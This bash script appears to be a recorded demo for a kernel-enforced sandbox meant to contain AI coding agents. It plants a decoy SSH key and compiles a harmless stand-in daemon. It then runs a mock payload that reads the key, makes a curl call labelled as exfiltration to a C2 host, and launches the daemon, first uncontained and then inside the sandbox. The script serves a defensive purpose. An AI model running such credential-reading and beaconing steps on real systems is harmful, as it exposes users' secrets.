#!/usr/bin/env bash
#
# QuantmLayer SECURITY demo (Tier 2, FULL THREE-WALL, enforcing) — the real
# exec-wall version, for a host with tier1 BPF-LSM (or tier2 seccomp-notify)
# and a `--features lsm` build. Every block is genuine: filesystem (mount),
# network (default-deny), AND exec (content-verified, by binary hash).
#
# WHY A LEARNED PROFILE (not --agent):
#   Content-verified exec only arms when a profile sets `exec.enforce: true`
#   with measured `allow_digests` — host-specific hashes of the approved
#   binaries. Bundled agent profiles ship portable path allow-lists, NOT
#   digests, so `ql agent` runs with exec NOT content-verified (ql now says so).
#   This demo LEARNS an enforcing profile from the legit toolchain first, so the
#   dropped payload binary — never measured — is denied at execve for real.
#
# POSTURE / PREREQS:
#   * A `--features lsm` build at the profiled path, AppArmor profile loaded
#     (on Ubuntu 24.04: the installer's profile, or relax
#     kernel.apparmor_restrict_unprivileged_userns for a throwaway box).
#   * Run under sudo. Verify first:  ql doctor  (want exec_wall tier1/tier2).
#
# RECORDING:
#   sudo QL=/usr/local/bin/ql asciinema rec -c "sudo QL=/usr/local/bin/ql ./demo/security-enforced.sh" ql-security.cast
#
# Pacing knobs (seconds): TYPE_SPEED WORD_DELAY LINE_DELAY BEAT (0 = instant).

set -u

QL="${QL:-ql}"
TYPE_SPEED="${TYPE_SPEED:-0.03}"
WORD_DELAY="${WORD_DELAY:-0.06}"
LINE_DELAY="${LINE_DELAY:-0.05}"
BEAT="${BEAT:-1.4}"

WORK="$(mktemp -d)"
# Decoy secret at the REAL ssh path (outside anything the enforcing profile
# grants) so the mount wall genuinely hides it in the cell. SUDO_USER resolves
# to the invoking user's home even under sudo; fall back to $HOME.
VICTIM_HOME="$(getent passwd "${SUDO_USER:-$USER}" | cut -d: -f6)"
VICTIM_HOME="${VICTIM_HOME:-$HOME}"
DECOY_KEY="$VICTIM_HOME/.ssh/quantmlayer_demo_key"
AUDIT="$WORK/incident.jsonl"
PROFILE="$WORK/enforced.yaml"
# The payload's dropped ELF "persistence" binary — a real compiled binary that
# is NEVER measured during learn, so its hash isn't in allow_digests.
PAYLOAD_SRC="$WORK/openclaw.c"
PAYLOAD_BIN="$WORK/openclaw"

C_CYAN='\033[1;36m'; C_GRAY='\033[0;90m'; C_GREEN='\033[1;32m'
C_RED='\033[1;31m';  C_YELLOW='\033[1;33m'; C_RESET='\033[0m'

words() {
  local color="$1"; shift
  local first=1 w
  printf '%b' "$color"
  for w in $*; do
    [ $first -eq 1 ] && first=0 || printf ' '
    printf '%s' "$w"; sleep "$WORD_DELAY"
  done
  printf '%b\n' "$C_RESET"
}
headline() { printf '\n'; words "$C_CYAN" "$@"; }
note()     { words "$C_GRAY" "$@"; }
good()     { words "$C_GREEN" "$@"; }
danger()   { words "$C_RED" "$@"; }

typecmd() {
  printf '%b$%b ' "$C_GRAY" "$C_RESET"
  local s="$*" i
  for (( i=0; i<${#s}; i++ )); do printf '%s' "${s:i:1}"; sleep "$TYPE_SPEED"; done
  printf '\n'; sleep 0.3
}
reveal() { local l; while IFS= read -r l; do printf '%s\n' "$l"; sleep "$LINE_DELAY"; done; }

cleanup() { rm -rf "$WORK"; rm -f "$DECOY_KEY"; }
trap cleanup EXIT

# --- scene setup -------------------------------------------------------------
mkdir -p "$(dirname "$DECOY_KEY")"
echo "-----BEGIN OPENSSH PRIVATE KEY----- (demo decoy, do not use)" > "$DECOY_KEY"
# compile the payload's persistence binary (a real ELF, unlisted)
cat > "$PAYLOAD_SRC" <<'EOF'
#include <unistd.h>
int main(void){ const char m[]="[openclaw] persistence daemon started; operator API on :18789\n"; write(1,m,sizeof(m)-1); return 0; }
EOF
cc -o "$PAYLOAD_BIN" "$PAYLOAD_SRC" 2>/dev/null || { echo "need a C compiler (cc) for this demo"; exit 1; }

# The payload's three behaviors. Uses cat + curl (legit tools) + the dropped bin.
PAYLOAD='
echo "[payload] reading credentials...";  cat "'"$DECOY_KEY"'" 2>&1
echo "[payload] exfiltrating to C2...";    curl -sS -m5 https://example.com -o /dev/null 2>&1 && echo "  sent" || echo "  (no route)"
echo "[payload] installing persistence..."; "'"$PAYLOAD_BIN"'" 2>&1
'

# Learn an ENFORCING profile from the LEGIT toolchain only (cat + curl + sh) —
# NOT from the payload binary. This captures the approved binaries' digests so
# the cell runs normally, while the dropped daemon (never measured) is denied.
# Done before recording; the demo shows the result, not the learn step.
"$QL" learn --out "$PROFILE" -- sh -c 'cat /etc/hostname >/dev/null; curl -sS -m2 https://example.invalid -o /dev/null 2>/dev/null; true' >/dev/null 2>&1 || true
# Ensure the decoy secret's dir is not granted (learn only grants what it saw).

clear
words "$C_CYAN" "QuantmLayer — containment for the AI coding agent supply chain"
words "$C_GRAY" "The threat isn't theoretical. The containment is."
sleep "$BEAT"

# --- beat 1: the real incidents ---------------------------------------------
headline "1. Agents are wired into dev machines faster than they're contained."
note "Feb 2026 — a malicious coding-agent npm release shipped a payload to"
note "  ~4,000 machines in 8 hours: read SSH keys, ran shell commands, phoned"
note "  home, installed a persistent daemon.  (StepSecurity, Snyk, A. Khan)"
note "Apr 2026 — a major agent CLI: CVSS 10.0 RCE, pre-sandbox, in CI."
note "  (Google GHSA-wpqr-6v78-jr5g / CVE-2026-12537)"
danger "This is a category problem. The payload's BEHAVIOR is the threat."
sleep "$BEAT"

# --- beat 2: the payload, uncontained ---------------------------------------
headline "2. Here is that payload's behavior, run UNCONTAINED:"
note "(a faithful stand-in: read the key, reach a C2 host, drop+launch a daemon)"
typecmd "sh -c '<payload: read key · exfiltrate · persist>'"
{ sh -c "$PAYLOAD" 2>&1; } | reveal
danger "^ key read, egress succeeded, daemon launched. This is what hit 4,000 machines."
sleep "$BEAT"

# --- beat 3: the SAME payload, inside a QuantmLayer cell --------------------
headline "3. The SAME payload, inside a QuantmLayer cell — three walls, three stops:"
note "An enforcing profile: workspace-only files, egress default-deny, exec"
note "content-verified by hash. We change NOTHING about the payload."
typecmd "$QL run --profile enforced.yaml --audit \$AUDIT -- sh -c '<same payload>'"
{ "$QL" run --profile "$PROFILE" --audit "$AUDIT" -- sh -c "$PAYLOAD" 2>&1; } | reveal
good "^ key: not present.  egress: no route.  daemon: DENIED at execve (its hash"
good "  was never approved). Same payload. Three walls, three hostile actions stopped."
sleep "$BEAT"

# --- beat 4: the proof -------------------------------------------------------
headline "4. And the containment is provable after the fact."
note "Each run commits its governing policy — and the exec tier — to a chain:"
typecmd "$QL audit verify \$AUDIT"
{ "$QL" audit verify "$AUDIT" 2>&1; } | reveal
good "^ INTACT. Third-party-verifiable evidence of what governed the run."
sleep "$BEAT"

# --- close -------------------------------------------------------------------
headline "The agent doesn't have to be trusted. The cell doesn't trust it."
note "Learned from behavior. Enforced by the kernel. Provable after the fact."
note "github.com/quantmlayer/quantmlayer"
